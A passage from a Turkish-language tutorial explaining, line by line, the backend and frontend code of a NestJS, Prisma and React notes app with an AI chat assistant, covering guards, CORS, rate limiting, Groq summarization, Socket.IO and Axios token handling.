- `jwtService.verifyAsync`: Token'in imzasını doğrular ve süresinin dolup dolmadığını kontrol eder.
- `request['user'] = payload`: Doğrulanan payload'ı request objesine ekler. Böylece `@CurrentUser()` decorator'ı buna erişebilir.
- Token geçersizse veya süresi dolmuşsa `UnauthorizedException` fırlatır.

```typescript
  private extractTokenFromHeader(request: Request): string | undefined {
    const [type, token] = request.headers.authorization?.split(' ') ?? [];
    return type === 'Bearer' ? token : undefined;
  }
}
```

- `request.headers.authorization`: `"Bearer eyJhbGciOiJIUzI1NiIs..."`
- `split(' ')`: `["Bearer", "eyJhbGciOiJIUzI1NiIs..."]`
- `type === 'Bearer'`: Eğer tip `Bearer` ise token'i döndür.

### 7.2 RolesGuard

```typescript
import { CanActivate, ExecutionContext, Injectable } from '@nestjs/common';
import { Reflector } from '@nestjs/core';
import { ROLES_KEY } from '../decorators/roles.decorator';

@Injectable()
export class RolesGuard implements CanActivate {
  constructor(private reflector: Reflector) {}

  canActivate(context: ExecutionContext): boolean {
    const requiredRoles = this.reflector.getAllAndOverride<string[]>(ROLES_KEY, [
      context.getHandler(),
      context.getClass(),
    ]);
    if (!requiredRoles) {
      return true;
    }
    const { user } = context.switchToHttp().getRequest();
    return requiredRoles.some((role) => user.role === role);
  }
}
```

- `@Roles('ADMIN')` decorator'ı ile işaretlenmiş route'larda çalışır.
- `requiredRoles`: Gereken roller.
- Eğer route rol gerektirmiyorsa (`!requiredRoles`) `true` döner.
- Kullanıcının rolü, gereken rollerden biriyle eşleşiyorsa `true` döner.

**Guard Çalışma Sırası:**

```
İstek → ThrottlerGuard → AuthGuard → RolesGuard → Controller → Service
```

### 7.3 CORS (Cross-Origin Resource Sharing)

**CORS Nedir?**

Tarayıcı güvenliği politikasıdır. Bir web sayfası (`localhost:5173`), farklı bir origin'deki (`localhost:3001`) kaynaklara istek atmasını kısıtlar.

**Neden CORS Gerekli?**

Frontend `http://localhost:5173`'den, backend `http://localhost:3001`'den çalışır. İkisi farklı origin'dir (port farklı). Tarayıcı, güvenlik nedeniyle bu isteği engeller.

```
Origin = Protocol + Domain + Port
http://localhost:5173 ≠ http://localhost:3001
```

**CORS Çözümü:**

```typescript
app.enableCors({
  origin: process.env.FRONTEND_URL || 'http://localhost:5173',
  credentials: true,
});
```

- `origin`: Hangi origin'den gelen isteklere izin verileceği.
- `credentials: true`: Cookie, Authorization header gibi kimlik bilgilerinin gönderilmesine izin verir.

Backend, CORS preflight (`OPTIONS`) isteklerine şu header'ları ekler:
```
Access-Control-Allow-Origin: http://localhost:5173
Access-Control-Allow-Credentials: true
Access-Control-Allow-Methods: GET, POST, PUT, DELETE, PATCH
Access-Control-Allow-Headers: Content-Type, Authorization
```

### 7.4 Rate Limiting (İstek Sınırlama)

```typescript
ThrottlerModule.forRoot([
  {
    ttl: 60000,    // Time-to-live: 60 saniyelik pencere
    limit: 30,     // Bu pencerede en fazla 30 istek
  },
]),
```

- `ttl: 60000`: 60 saniyelik bir zaman penceresi.
- `limit: 30`: Bu pencerede aynı IP'den en fazla 30 istek.

**Nasıl Çalışır?**

Her istek geldiğinde, ThrottlerGuard IP adresine bakar ve son 60 saniyede kaç istek geldiğini sayar. 30'u aşıyorsa:

```json
{
  "statusCode": 429,
  "message": "ThrottlerException: Too Many Requests"
}
```

**Neden Rate Limiting?**

| Saldırı Türü | Açıklama |
|--------------|----------|
| **Brute Force** | Şifre denemesi. `"123456"`, `"password"` gibi yaygın şifreleri sistematik deneme. |
| **DoS (Denial of Service)** | Sistemi aşırı istekle meşgul ederek normal kullanıcılara hizmet veremez hale getirme. |
| **API Abuse** | Maliyetli API'leri (AI, ödeme) aşırı kullanma. |

---

## 8. Backend: Modüllerin Detaylı İncelenmesi

### 8.1 Notes Modülü

#### `notes.controller.ts` Tam İnceleme

```typescript
@Controller('notes')
@UseGuards(AuthGuard)
export class NotesController {
  constructor(private notesService: NotesService) {}
```

`@Controller('notes')` bu sınıfı `/notes` path'ine bağlar. `@UseGuards(AuthGuard)` tüm method'ları korumalı yapar.

```typescript
  @Get()
  findAll(
    @CurrentUser('sub') userId: string,
    @Query('archived') archived?: string,
    @Query('search') search?: string,
  ) {
    return this.notesService.findAll(userId, archived === 'true', search);
  }
```

- `@Get()`: `GET /notes` endpoint'i.
- `@Query('archived')`: URL'deki `?archived=true` parametresi. String geldiği için `=== 'true'` ile boolean'a çevrilir.
- `@Query('search')`: URL'deki `?search=merhaba` parametresi.

**Örnek istekler:**

```bash
GET /notes                    → Tüm aktif notları getir
GET /notes?archived=true      → Tüm arşivlenmiş notları getir
GET /notes?search=proje       → Başlık veya özetinde "proje" geçen notları getir
GET /notes?archived=true&search=proje  → Arşivlenmiş ve "proje" içeren notları getir
```

#### `notes.service.ts` findAll Metodu

```typescript
async findAll(userId: string, archived?: boolean, search?: string) {
  return this.prisma.note.findMany({
    where: {
      userId,
      isArchived: archived ?? false,
      ...(search
        ? {
            OR: [
              { title: { contains: search, mode: 'insensitive' } },
              { summary: { contains: search, mode: 'insensitive' } },
            ],
          }
        : {}),
    },
    include: {
      tags: { include: { tag: true } },
      blocks: { orderBy: { order: 'asc' } },
    },
    orderBy: [{ isPinned: 'desc' }, { updatedAt: 'desc' }],
  });
}
```

**where:**
- `userId`: Sadece bu kullanıcının notları. **Bu, kullanıcı izolasyonunun temelidir.**
- `isArchived: archived ?? false`: Eğer `archived` parametresi verilmediyse (`undefined`), `false` kullan (aktif notlar).
- `...(search ? { OR: [...] } : {})`: **Koşullu spread operator.** Eğer `search` varsa, `OR` filtresini ekle. Yoksa boş obje `{}` ekle (hiçbir etkisi olmaz).

**include:**
- `tags: { include: { tag: true } }`:
  - `Note` → `NoteTag[]` (notun etiket ilişkileri)
  - Her `NoteTag` → `Tag` (etiketin kendisi)
  - Sonuç: `[{ tag: { id, name, color } }]`

- `blocks: { orderBy: { order: 'asc' } }`: Blokları `order` alanına göre artan sırada getir.

**orderBy:**
- `[{ isPinned: 'desc' }, { updatedAt: 'desc' }]`:
  - Önce `isPinned` true olanlar (desc = büyükten küçüğe, `true` > `false`)
  - Sonra `updatedAt`'e göre en yeniden en eskiye

#### Prisma Sorgularının SQL Karşılıkları

`findAll` sorgusunun ürettiği SQL (yaklaşık):

```sql
SELECT n.*, t.id as tag_id, t.name as tag_name, t.color as tag_color,
       b.id as block_id, b.type as block_type, b.content as block_content, b."order" as block_order
FROM "Note" n
LEFT JOIN "NoteTag" nt ON n.id = nt."noteId"
LEFT JOIN "Tag" t ON nt."tagId" = t.id
LEFT JOIN "Block" b ON n.id = b."noteId"
WHERE n."userId" = 'user_123'
  AND n."isArchived" = false
  AND (
    n.title ILIKE '%proje%'
    OR n.summary ILIKE '%proje%'
  )
ORDER BY n."isPinned" DESC, n."updatedAt" DESC, b."order" ASC;
```

### 8.2 Blocks Modülü

```typescript
export interface BlockInput {
  id?: string;
  type: BlockType;
  content: Record<string, any>;
  order: number;
}
```

- `id?: string`: Opsiyonel ID. Prisma CUID üretir.
- `type: BlockType`: Block tipi (paragraph, heading, vs.).
- `content: Record<string, any>`: JSON formatında esnek içerik.
- `order: number`: Sıra numarası.

```typescript
async saveBlocks(userId: string, noteId: string, blocks: BlockInput[]) {
  // 1. SAHİPLİK KONTROLÜ
  const note = await this.prisma.note.findFirst({
    where: { id: noteId, userId },
  });
  if (!note) {
    throw new ForbiddenException('You do not own this note');
  }
```

**Güvenlik Kontrolü:** Kullanıcı, `noteId`'li notun gerçekten sahibi mi? `userId` filtresi sayesinde başka kullanıcının notuna erişilemez.

```typescript
  // 2. Eski blokları sil
  await this.prisma.block.deleteMany({ where: { noteId } });
```

Tüm eski blokları sil. Bu, **replace** stratejisidir.

```typescript
  // 3. Yeni blokları oluştur
  await this.prisma.block.createMany({
    data: blocks.map((b) => ({
      noteId,
      type: b.type,
      content: b.content,
      order: b.order,
    })),
  });
```

`createMany`: Tek bir sorguda birden fazla kayıt oluşturur. Döngüde tek tek `create` yapmaktan çok daha hızlıdır.

```typescript
  // 4. Kaydedilen blokları getir
  const saved = await this.prisma.block.findMany({
    where: { noteId },
    orderBy: { order: 'asc' },
  });
```

```typescript
  // 5. AI özetlemesi tetikle
  const plainText = saved
    .map((b) => {
      const c = b.content as any;
      return c.text || c.html || '';
    })
    .join(' ');

  if (plainText.length > 20) {
    this.aiService.processNote(noteId, note.title, plainText).catch(() => {});
  }

  return saved;
}
```

- `this.aiService.processNote(...).catch(() => {})`: AI işlemi asenkron ve başarısız olabilir. Hata yutulur (fire-and-forget). Not kaydetme işlemi AI hatasından etkilenmez.

### 8.3 Tags Modülü

```typescript
async create(userId: string, data: { name: string; color?: string }) {
  try {
    return await this.prisma.tag.create({
      data: { name: data.name, color: data.color || '#3b82f6', userId },
    });
  } catch (e: any) {
    if (e.code === 'P2002') throw new ConflictException('Tag already exists');
    throw e;
  }
}
```

- `e.code === 'P2002'`: Prisma'nın unique constraint ihlali hata kodu.
- `@@unique([name, userId])` sayesinde aynı kullanıcı aynı isimde iki etiket oluşturamaz.

```typescript
async attach(userId: string, noteId: string, tagId: string) {
  const note = await this.prisma.note.findFirst({ where: { id: noteId, userId } });
  if (!note) throw new NotFoundException('Note not found');
  const tag = await this.prisma.tag.findFirst({ where: { id: tagId, userId } });
  if (!tag) throw new NotFoundException('Tag not found');

  return this.prisma.noteTag.create({
    data: { noteId, tagId },
  }).catch(() => null);
}
```

- Hem notun hem etiketin kullanıcıya ait olduğunu kontrol eder.
- `.catch(() => null)`: Aynı etiket aynı nota iki kez eklenmeye çalışılırsa hatayı yutar.

### 8.4 Chat Modülü

#### Chat Service — sendMessage Metodu

```typescript
async sendMessage(userId: string, chatId: string, content: string) {
  const chat = await this.findOne(userId, chatId);
```

- Önce sohbetin varlığını ve kullanıcının sahipliğini kontrol et.

```typescript
  // Kullanıcı mesajını kaydet
  await this.prisma.message.create({
    data: { chatId, role: 'user', content },
  });
```

- Kullanıcının mesajını veritabanına kaydet.

```typescript
  // Kullanıcının notlarını context olarak al
  const notes = await this.prisma.note.findMany({
    where: { userId, isArchived: false },
    include: { blocks: true },
    orderBy: { updatedAt: 'desc' },
  });
```

- Kullanıcının tüm aktif notlarını getir. Blokları da dahil et.
- `orderBy: { updatedAt: 'desc' }`: En son güncellenen notlar önce gelsin.

```typescript
  const noteContext = notes
    .map((n, i) => {
      const plainText = n.blocks
        .map((b) => {
          const c = b.content as any;
          return c.text || c.html || '';
        })
        .join(' ');
      return `NOT ${i + 1}:
Başlık: "${n.title}"
İçerik: ${plainText.slice(0, 600)}`;
    })
    .join('\n\n---\n\n');
```

- Her notun bloklarını düz metne çevir.
- En fazla 600 karakter al (token limiti ve maliyet için).
- Notları numaralandırarak formatla.

```typescript
  const systemPrompt = `Sen yardımcı bir AI asistanısın. Kullanıcıya Türkçe cevap verirsin.

KULLANICININ NOTLARI:
${noteContext || '(Henüz not yok)'}

DAVRANIŞ KURALLARI:
1. Kullanıcı notlardan bahsettiğinde, yukarıdaki NOTLAR bölümünden bilgi alarak cevap ver.
2. Kullanıcı "erişebildiğin notları söyle" dediğinde, yukarıdaki notların BAŞLIKLARINI liste olarak ver.
3. Kullanıcı bir notun içeriğini sorarsa, o notun içeriğini paylaş ve yardımcı ol.
4. NOTLARI ASLA DÜZENLEME. Sadece oku ve kullanıcıya bilgi ver.`;
```

- **System Prompt:** AI'a verilen talimatlar. Bu prompt, AI'ın davranışını şekillendirir.
- `NOTLARI ASLA DÜZENLEME`: AI'ın notları değiştirmesini engelleyen kritik kural.

```typescript
  const history = chat.messages.map((m) => ({
    role: m.role as 'user' | 'assistant',
    content: m.content,
  }));
```

- Sohbet geçmişini formatla. AI, önceki mesajları hatırlamak için bunlara ihtiyaç duyar.

```typescript
  const aiReply = await this.aiService.chatCompletion([
    { role: 'system', content: systemPrompt },
    ...history,
    { role: 'user', content },
  ]);
```

- LLM'e mesaj dizisi gönder:
  1. `system`: AI'ın davranışını tanımlar
  2. `history`: Önceki mesajlar
  3. `user`: Yeni kullanıcı mesajı

```typescript
  await this.prisma.message.create({
    data: { chatId, role: 'assistant', content: aiReply.trim() },
  });

  return this.findOne(userId, chatId);
}
```

- AI'ın cevabını veritabanına kaydet.
- Güncellenmiş sohbeti (tüm mesajları) döndür.

### 8.5 AI Modülü (Groq Entegrasyonu)

```typescript
@Injectable()
export class AiService {
  private openai: OpenAI | null = null;
  private hasKey: boolean;

  constructor(private prisma: PrismaService) {
    this.hasKey = !!process.env.OPENAI_API_KEY;
    if (this.hasKey) {
      this.openai = new OpenAI({
        apiKey: process.env.OPENAI_API_KEY,
        baseURL: 'https://api.groq.com/openai/v1',
      });
    }
  }
```

- `private openai: OpenAI | null = null`: OpenAI SDK instance'ı. Groq ile uyumlu.
- `baseURL: 'https://api.groq.com/openai/v1'`: OpenAI API yerine Groq API'ye yönlendirme.
- `hasKey`: API key var mı? Yoksa AI özellikleri devre dışı.

```typescript
  async processNote(noteId: string, title: string, content: string) {
    if (!this.hasKey) return;
    try {
      const [summary, embedding] = await Promise.all([
        this.summarize(content),
        this.createEmbedding(`${title}\n${content}`),
      ]);
```

- `Promise.all`: `summarize` ve `createEmbedding`'i paralel çalıştır. İkisi de birbirinden bağımsız.

```typescript
      await this.prisma.note.update({
        where: { id: noteId },
        data: { summary },
      });
```

- Özeti nota kaydet.

```typescript
      const existing = await this.prisma.$queryRawUnsafe<any[]>(
        `SELECT id FROM "Embedding" WHERE "noteId" = $1`,
        noteId,
      );
```

- `pgvector` ile çalışmak için ham SQL kullanılır. Prisma `vector` tipini native desteklemez.
- `$queryRawUnsafe`: Ham SQL sorgusu. Dikkat: Parametreler `$1`, `$2` gibi placeholder'larla geçilirse SQL injection güvenlidir.

```typescript
      if (existing.length > 0) {
        await this.prisma.$executeRawUnsafe(
          `UPDATE "Embedding" SET "vector" = $1::vector WHERE "noteId" = $2`,
          JSON.stringify(embedding),
          noteId,
        );
      } else {
        await this.prisma.$executeRawUnsafe(
          `INSERT INTO "Embedding" (id, "noteId", "vector") VALUES ($1, $2, $3::vector)`,
          randomUUID(),
          noteId,
          JSON.stringify(embedding),
        );
      }
    } catch (err) {
      console.error('AI processing failed', err);
    }
  }
```

- Embedding varsa güncelle, yoksa oluştur.
- `::vector`: PostgreSQL'e bu değerin `vector` tipinde olduğunu söyler.

```typescript
  async summarize(text: string): Promise<string> {
    if (!this.openai) return '';
    const response = await this.openai.chat.completions.create({
      model: 'llama-3.1-8b-instant',
      messages: [
        { role: 'system', content: 'Summarize the following text in 2-3 sentences in Turkish.' },
        { role: 'user', content: text.slice(0, 4000) },
      ],
      temperature: 0.3,
    });
    return response.choices[0].message.content || '';
  }
```

- `model: 'llama-3.1-8b-instant'`: Kullanılan LLM modeli.
- `messages`: Chat formatında mesaj dizisi.
- `temperature: 0.3`: Düşük sıcaklık = daha tutarlı, deterministik çıktı.
- `text.slice(0, 4000)`: LLM'in context limitine sığdırmak için metni kırp.

**Temperature (Sıcaklık) Nedir?**

| Temperature | Davranış | Kullanım |
|-------------|----------|----------|
| 0.0 | Çok deterministik, her zaman aynı cevap | Özetleme, kod, veri çıkarma |
| 0.3-0.5 | Tutarlı ama biraz yaratıcı | Özetleme, analiz |
| 0.7-1.0 | Yaratıcı, çeşitli cevaplar | Yaratıcı yazma, beyin fırtınası |

```typescript
  async createEmbedding(text: string): Promise<any> {
    // Groq does not support embeddings API; return dummy vector
    return new Array(1536).fill(0).map(() => Math.random() - 0.5);
  }
```

- **Fallback:** Groq embedding API desteklemediği için rastgele vektör döndürür.
- Bu, semantic search'in doğru çalışmamasına neden olur.
- Üretimde OpenAI `text-embedding-3-small`, Cohere veya Ollama gibi bir embedding sağlayıcı eklenmelidir.

### 8.6 Search Modülü

```typescript
async semanticSearch(userId: string, query: string) {
  const keywordMatches = await this.prisma.note.findMany({
    where: {
      userId,
      OR: [
        { title: { contains: query, mode: 'insensitive' } },
        { summary: { contains: query, mode: 'insensitive' } },
      ],
    },
    select: { id: true, title: true, summary: true, createdAt: true, updatedAt: true },
    orderBy: { updatedAt: 'desc' },
    take: 10,
  });
```

- `select`: Sadece belirtilen alanları getir. Veri transferini azaltır.
- `take: 10`: En fazla 10 sonuç.

```typescript
  if (keywordMatches.length > 0) {
    return keywordMatches.map((r) => ({
      ...r,
      similarity: 0.95,
    }));
  }
```

- Eğer keyword eşleşmesi varsa, bunları `similarity: 0.95` ile döndür.

```typescript
  const recentNotes = await this.prisma.note.findMany({
    where: { userId },
    select: { id: true, title: true, summary: true, createdAt: true, updatedAt: true },
    orderBy: { updatedAt: 'desc' },
    take: 10,
  });

  return recentNotes.map((r) => ({ ...r, similarity: 0.5 }));
}
```

- Eğer hiç keyword eşleşmesi yoksa, son güncellenen 10 notu döndür.

### 8.7 Notifications Modülü (Socket.IO)

```typescript
@WebSocketGateway({
  cors: {
    origin: process.env.FRONTEND_URL || 'http://localhost:5173',
    credentials: true,
  },
})
export class NotificationsGateway implements OnGatewayConnection, OnGatewayDisconnect {
  @WebSocketServer()
  server: Server;
```

- `@WebSocketGateway`: Bu class bir Socket.IO gateway'dir.
- `@WebSocketServer()`: Socket.IO server instance'ına erişim sağlar.

```typescript
  async handleConnection(client: Socket) {
    try {
      const token =
        (client.handshake.auth.token as string) ||
        (client.handshake.query.token as string);
      if (!token) {
        client.disconnect();
        return;
      }
      const payload = await this.jwtService.verifyAsync(token, {
        secret: process.env.JWT_SECRET,
      });
      (client as any).userId = payload.sub;
      client.join(`user:${payload.sub}`);
    } catch {
      client.disconnect();
    }
  }
```

- `handleConnection`: Client bağlandığında çalışır.
- `client.handshake.auth.token`: Socket.IO bağlantısında gönderilen auth token.
- `client.join(`user:${payload.sub}`)`: Kullanıcıya özel room'a katılır.
- Room: Socket.IO'da mesaj gruplarıdır. `user:123` room'una mesaj gönderildiğinde, sadece bu room'daki client'lar alır.

```typescript
  sendToUser(userId: string, event: string, data: any) {
    this.server.to(`user:${userId}`).emit(event, data);
  }
```

- `this.server.to(`user:${userId}`)`: Belirli bir kullanıcının room'unu hedefler.
- `.emit(event, data)`: Bu room'daki tüm client'lara mesaj gönderir.

---

## 9. Frontend: React ve Ekosistemi

### 9.1 React Temel Kavramları

#### Component (Bileşen)

React'te her şey bir bileşendir. Bir buton, bir form, bir sayfa — hepsi bileşendir.

```tsx
function Button({ label, onClick }: { label: string; onClick: () => void }) {
  return <button onClick={onClick}>{label}</button>;
}
```

- `Button`: Bileşenin adı. Büyük harfle başlar.
- `{ label, onClick }`: Props (properties). Bileşene dışarıdan veri aktarma mekanizması.
- `return`: JSX döndürür. JSX, JavaScript içinde HTML benzeri syntax yazmanızı sağlar.

#### JSX Nedir?

JSX, JavaScript XML'dir. Derleme sırasında `React.createElement` çağrılarına dönüştürülür.

```tsx
// JSX
<div className="card">
  <h1>Merhaba</h1>
</div>

// Derlenmiş hali
React.createElement('div', { className: 'card' },
  React.createElement('h1', null, 'Merhaba')
);
```

#### State (Durum)

State, bileşenin içinde değişebilen veridir. State değiştiğinde bileşen yeniden render edilir.

```tsx
import { useState } from 'react';

function Counter() {
  const [count, setCount] = useState(0);

  return (
    <button onClick={() => setCount(count + 1)}>
      Sayı: {count}
    </button>
  );
}
```

- `useState(0)`: State oluşturur. İlk değer `0`.
- `[count, setCount]`: `count` state değeri, `setCount` state güncelleme fonksiyonu.
- `setCount(count + 1)`: State güncellenir, bileşen yeniden render edilir.

#### useEffect (Efekt)

`useEffect`, yan etkileri (side effects) yönetmek için kullanılır. API çağrıları, DOM manipülasyonu, subscription'lar gibi işlemler.

```tsx
import { useEffect } from 'react';

function UserProfile({ userId }: { userId: string }) {
  useEffect(() => {
    // Bileşen mount edildiğinde çalışır
    fetchUser(userId);

    // Bileşen unmount edildiğinde çalışır (cleanup)
    return () => {
      console.log('Temizlik');
    };
  }, [userId]);  // userId değiştiğinde tekrar çalışır
}
```

- `useEffect(callback, dependencies)`:
  - `callback`: Efekt fonksiyonu.
  - `dependencies`: Bu array'deki değerlerden biri değiştiğinde efekt tekrar çalışır.
  - Boş array `[]`: Sadece bileşen mount edildiğinde bir kez çalışır.
  - Return fonksiyonu: Bileşen unmount edildiğinde veya efekt tekrar çalışmadan önce çalışır.

#### useRef (Referans)

`useRef`, render'lar arasında değer saklamak için kullanılır. State'ten farkı, değiştiğinde yeniden render tetiklemez.

```tsx
const inputRef = useRef<HTMLInputElement>(null);

// Kullanım
inputRef.current?.focus();
```

```tsx
const timeoutRef = useRef<ReturnType<typeof setTimeout> | null>(null);

// Debounce için
if (timeoutRef.current) clearTimeout(timeoutRef.current);
timeoutRef.current = setTimeout(() => {
  saveData();
}, 2000);
```

#### useCallback

`useCallback`, fonksiyonları memoize eder (hafızada tutar). Aynı bağımlılıklar varsa aynı fonksiyon instance'ını döndürür.

```tsx
const handleUpdate = useCallback(async (data: Partial<Note>) => {
  if (!activeNoteId) return;
  const res = await notesApi.update(activeNoteId, data);
  setNotes((prev) => prev.map((n) => (n.id === activeNoteId ? { ...n, ...res.data } : n)));
}, [activeNoteId]);
```

- `activeNoteId` değişmedikçe aynı fonksiyon instance'ını döndürür.
- Child bileşenlere prop olarak geçildiğinde gereksiz render'ları önler.

### 9.2 Vite ve Build Süreci

**Geliştirme Modu:**

```bash
npm run dev
```

Vite, kodunuzu ESM (ES Module) olarak sunar. Tarayıcı, ihtiyaç duyduğu modülleri doğrudan sunucudan ister. Değişiklik olduğunda sadece değişen modül güncellenir (HMR — Hot Module Replacement).

**Build Modu:**

```bash
npm run build
```

Vite, Rollup kullanarak:
1. Kodu bundle eder (tek dosyada toplar).
2. Tree-shaking yapar (kullanılmayan kodları kaldırır).
3. Minification (küçültme) uygular.
4. Code splitting yapar (büyük dosyaları parçalara ayırır).

### 9.3 Tailwind CSS

Tailwind, utility-first CSS framework'üdür. Önceden tanımlanmış sınıflarla stil verirsiniz.

**Temel Utility Sınıfları:**

| Sınıf | CSS Karşılığı |
|-------|---------------|
| `flex` | `display: flex` |
| `items-center` | `align-items: center` |
| `justify-between` | `justify-content: space-between` |
| `p-4` | `padding: 1rem` (16px) |
| `m-2` | `margin: 0.5rem` (8px) |
| `bg-blue-500` | `background-color: #3b82f6` |
| `text-white` | `color: #ffffff` |
| `rounded-lg` | `border-radius: 0.5rem` |
| `shadow-md` | `box-shadow: ...` |
| `h-4` | `height: 1rem` (16px) |
| `w-4` | `width: 1rem` (16px) |

**Responsive Prefix'ler:**

```html
<div class="w-full md:w-1/2 lg:w-1/3">
  <!-- Mobil: tam genişlik
       Tablet (768px+): yarım genişlik
       Desktop (1024px+): üçte bir genişlik -->
</div>
```

**Dark Mode:**

```html
<div class="bg-white dark:bg-gray-900 text-black dark:text-white">
  <!-- Aydınlık: beyaz arka plan, siyah metin
       Karanlık: koyu gri arka plan, beyaz metin -->
</div>
```

### 9.4 TipTap Editor

TipTap, ProseMirror tabanlı bir rich text editörüdür.

```tsx
const editor = useEditor({
  extensions: [
    StarterKit.configure({
      heading: { levels: [1, 2, 3] },
    }),
    Placeholder.configure({ placeholder: 'Bir şeyler yaz...' }),
    Image,
  ],
  content,
  onUpdate: ({ editor }) => {
    onChange(editor.getHTML(), editor.getJSON());
  },
});
```

- `extensions`: Editörün yeteneklerini tanımlar.
  - `StarterKit`: Bold, italic, heading, list, blockquote, code, history gibi temel özellikler.
  - `Placeholder`: Boş editörde placeholder metin gösterir.
  - `Image`: Resim ekleme desteği.
- `content`: Editörün başlangıç içeriği (HTML string).
- `onUpdate`: İçerik değiştiğinde çağrılır.
  - `editor.getHTML()`: HTML çıktısı.
  - `editor.getJSON()`: JSON çıktısı (Prisma Block yapısına dönüştürülür).

**ProseMirror JSON Yapısı:**

```json
{
  "type": "doc",
  "content": [
    {
      "type": "heading",
      "attrs": { "level": 1 },
      "content": [{ "type": "text", "text": "Başlık" }]
    },
    {
      "type": "paragraph",
      "content": [{ "type": "text", "text": "Paragraf metni." }]
    }
  ]
}
```

Bu JSON, `jsonToBlocks` fonksiyonuyla Prisma `Block` yapısına dönüştürülür.

---

## 10. Frontend: State ve API Yönetimi

### 10.1 Zustand Auth Store

```typescript
import { create } from 'zustand';

interface User {
  id: string;
  email: string;
  name: string | null;
  role: string;
}

interface AuthState {
  user: User | null;
  accessToken: string | null;
  setAuth: (user: User, accessToken: string) => void;
  logout: () => void;
}

export const useAuthStore = create<AuthState>((set) => ({
  user: JSON.parse(localStorage.getItem('user') || 'null'),
  accessToken: localStorage.getItem('accessToken'),
  setAuth: (user, accessToken) => {
    localStorage.setItem('user', JSON.stringify(user));
    localStorage.setItem('accessToken', accessToken);
    set({ user, accessToken });
  },
  logout: () => {
    localStorage.removeItem('user');
    localStorage.removeItem('accessToken');
    set({ user: null, accessToken: null });
  },
}));
```

**Satır Satır Açıklama:**

```typescript
interface User {
  id: string;
  email: string;
  name: string | null;
  role: string;
}
```

- `interface`: TypeScript'te obje yapısını tanımlama.
- `name: string | null`: `name` string veya `null` olabilir.

```typescript
interface AuthState {
  user: User | null;
  accessToken: string | null;
  setAuth: (user: User, accessToken: string) => void;
  logout: () => void;
}
```

- `user: User | null`: Giriş yapılmamışsa `null`, yapılmışsa `User` objesi.
- `setAuth: (user: User, accessToken: string) => void`: İki parametre alan, dönüş değeri olmayan fonksiyon.

```typescript
export const useAuthStore = create<AuthState>((set) => ({
```

- `create<AuthState>()`: Zustand store'u oluşturur. `AuthState` tipini kullanır.
- `(set) => ({ ... })`: Store'un initial state ve action'larını tanımlayan fonksiyon.
- `set`: State güncelleme fonksiyonu.

```typescript
  user: JSON.parse(localStorage.getItem('user') || 'null'),
```

- `localStorage.getItem('user')`: Tarayıcının localStorage'ından 'user' key'ini al.
- `'null'`: Eğer 'user' yoksa, `JSON.parse('null')` → `null`.
- `JSON.parse`: String'i JavaScript objesine çevirir.

```typescript
  accessToken: localStorage.getItem('accessToken'),
```

- Access token'ı localStorage'dan al. Sayfa yenilense bile korunur.

```typescript
  setAuth: (user, accessToken) => {
    localStorage.setItem('user', JSON.stringify(user));
    localStorage.setItem('accessToken', accessToken);
    set({ user, accessToken });
  },
```

- `localStorage.setItem`: Veriyi tarayıcıda kalıcı saklar.
- `JSON.stringify(user)`: Objeyi JSON string'e çevirir.
- `set({ user, accessToken })`: Zustand state'ini günceller. Bu, `useAuthStore`'u kullanan tüm bileşenleri yeniden render eder.

```typescript
  logout: () => {
    localStorage.removeItem('user');
    localStorage.removeItem('accessToken');
    set({ user: null, accessToken: null });
  },
}));
```

- `localStorage.removeItem`: Veriyi tarayıcıdan siler.
- `set({ user: null, accessToken: null })`: State'i sıfırlar.

**Kullanımı:**

```tsx
import { useAuthStore } from './store/authStore';

function Header() {
  const { user, logout } = useAuthStore();

  return (
    <div>
      {user ? (
        <>
          <span>Merhaba, {user.name}</span>
          <button onClick={logout}>Çıkış Yap</button>
        </>
      ) : (
        <a href="/login">Giriş Yap</a>
      )}
    </div>
  );
}
```

### 10.2 Axios ve API Servisi

```typescript
/// <reference types="vite/client" />
```

- Vite'in çevre değişkeni tiplerini TypeScript'e tanıtır. `import.meta.env.VITE_API_URL` gibi değişkenler tip güvenli olur.

```typescript
import axios from 'axios';
import { useAuthStore } from '../store/authStore';

const API_URL = import.meta.env.VITE_API_URL || 'http://localhost:3001';
```

- `import.meta.env`: Vite'in çevre değişkeni objesi. `VITE_` prefix'i ile başlayan değişkenler client tarafına exposed olur.
- `|| 'http://localhost:3001'`: Eğer çevre değişkeni tanımlanmamışsa varsayılan değer.

```typescript
export const api = axios.create({
  baseURL: API_URL,
  headers: { 'Content-Type': 'application/json' },
});
```

- `axios.create`: Axios instance'ı oluşturur. Tüm istekler için ortak konfigürasyon.
- `baseURL`: Tüm isteklerin başına eklenir. `api.get('/notes')` → `GET http://localhost:3001/notes`.

#### Request Interceptor

```typescript
api.interceptors.request.use((config) => {
  const token = useAuthStore.getState().accessToken;
  if (token) {
    config.headers.Authorization = `Bearer ${token}`;
  }
  return config;
});
```

- `api.interceptors.request.use`: Her HTTP isteğinden önce çalışan fonksiyon.
- `useAuthStore.getState()`: Zustand store'unun mevcut state'ini alır. Hook kullanmadan, doğrudan state'e erişim.
- `config.headers.Authorization`: İstek header'ına Bearer token ekler.

**Bearer Token Nedir?**

Bearer token, "bu token'ı taşıyan (bearer) kişi yetkilidir" anlamına gelir. OAuth 2.0 standardında kullanılır.

```
Authorization: Bearer eyJhbGciOiJIUzI1NiIs...
```

#### Response Interceptor (Token Refresh)

```typescript
let isRefreshing = false;
let refreshSubscribers: ((token: string) => void)[] = [];
```

- `isRefreshing`: Şu anda token yenileme işlemi devam ediyor mu?
- `refreshSubscribers`: Token yenilendiğinde haberdar edilecek callback fonksiyonlarının listesi.

```typescript
function onRefreshed(token: string) {
  refreshSubscribers.forEach((cb) => cb(token));
  refreshSubscribers = [];
}
```

- Token yenilendiğinde, bekleyen tüm callback'leri çağır.
- Listeyi temizle.

```typescript
api.interceptors.response.use(
  (response) => response,  // Başarılı yanıtları olduğu gibi geçir
  async (error) => {
    const originalRequest = error.config;
```

- `api.interceptors.response.use(successCallback, errorCallback)`.
- `error.config`: Başarısız olan isteğin konfigürasyonu.

```typescript
    if (error.response?.status === 401 && !originalRequest._retry) {
      originalRequest._retry = true;
```

- `error.response?.status === 401`: Sunucu "Unauthorized" (yetkisiz) döndürdü.
- `!originalRequest._retry`: Bu istek daha önce yenilenmeye çalışılmadı mı? Sonsuz döngüyü engeller.

```typescript
      const refreshToken = localStorage.getItem('refreshToken');
      if (!refreshToken) {
        useAuthStore.getState().logout();
        window.location.href = '/login';
        return Promise.reject(error);
      }
```

- Refresh token yoksa (kullanıcı çıkış yapmış veya token silinmiş), logout yap ve login sayfasına yönlendir.

```typescript
      if (isRefreshing) {
        return new Promise((resolve) => {
